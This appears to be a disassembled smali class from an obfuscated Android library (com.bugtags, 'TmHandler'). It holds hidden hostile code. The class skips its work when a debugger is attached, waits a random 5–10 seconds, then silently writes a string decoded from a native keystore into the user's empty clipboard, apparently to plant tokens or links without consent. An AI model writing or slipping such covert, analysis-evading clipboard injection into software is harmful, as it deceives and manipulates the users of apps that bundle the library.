.class public Lcom/bugtags/library/obfuscated/bq;
.super Ljava/lang/Object;
.source "TmHandler.java"


# instance fields
.field private fk:Landroid/app/Application;

.field private fl:[Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/app/Application;)V
    .locals 0

    .prologue
    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 24
    iput-object p1, p0, Lcom/bugtags/library/obfuscated/bq;->fk:Landroid/app/Application;

    .line 25
    return-void
.end method

.method static synthetic a(Lcom/bugtags/library/obfuscated/bq;)V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Lcom/bugtags/library/obfuscated/bq;->bn()V

    return-void
.end method

.method private bn()V
    .locals 4

    .prologue
    .line 47
    .line 49
    :try_start_0
    iget-object v0, p0, Lcom/bugtags/library/obfuscated/bq;->fk:Landroid/app/Application;

    const-string v1, "clipboard"

    invoke-virtual {v0, v1}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/ClipboardManager;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/bugtags/library/obfuscated/bq;->fl:[Ljava/lang/String;

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/bugtags/library/obfuscated/bq;->fl:[Ljava/lang/String;

    array-length v1, v1

    if-nez v1, :cond_1

    .line 66
    :cond_0
    :goto_0
    return-void

    .line 59
    :cond_1
    invoke-virtual {v0}, Landroid/content/ClipboardManager;->hasText()Z

    move-result v1

    if-nez v1, :cond_0

    .line 64
    iget-object v1, p0, Lcom/bugtags/library/obfuscated/bq;->fl:[Ljava/lang/String;

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    iget-object v3, p0, Lcom/bugtags/library/obfuscated/bq;->fl:[Ljava/lang/String;

    array-length v3, v3

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    aget-object v1, v1, v2

    .line 65
    invoke-virtual {v0, v1}, Landroid/content/ClipboardManager;->setText(Ljava/lang/CharSequence;)V

    goto :goto_0

    .line 50
    :catch_0
    move-exception v0

    goto :goto_0
.end method


# virtual methods
.method public C(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 69
    iget-object v0, p0, Lcom/bugtags/library/obfuscated/bq;->fk:Landroid/app/Application;

    if-nez v0, :cond_1

    .line 89
    :cond_0
    :goto_0
    return-void

    .line 73
    :cond_1
    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 79
    :try_start_0
    invoke-static {p1}, Lio/bugtags/platform/nat/NativeKeystore;->aa(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 84
    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 88
    const-string v1, ","

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/bugtags/library/obfuscated/bq;->fl:[Ljava/lang/String;

    goto :goto_0

    .line 80
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public b(Landroid/os/Handler;)V
    .locals 4

    .prologue
    .line 29
    invoke-static {}, Landroid/os/Debug;->isDebuggerConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 44
    :goto_0
    return-void

    .line 34
    :cond_0
    :try_start_0
    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v1, 0x6

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    add-int/lit8 v0, v0, 0x5

    .line 35
    new-instance v1, Lcom/bugtags/library/obfuscated/bq$1;

    invoke-direct {v1, p0}, Lcom/bugtags/library/obfuscated/bq$1;-><init>(Lcom/bugtags/library/obfuscated/bq;)V

    mul-int/lit16 v0, v0, 0x3e8

    int-to-long v2, v0

    invoke-virtual {p1, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 41
    :catch_0
    move-exception v0

    goto :goto_0
.end method
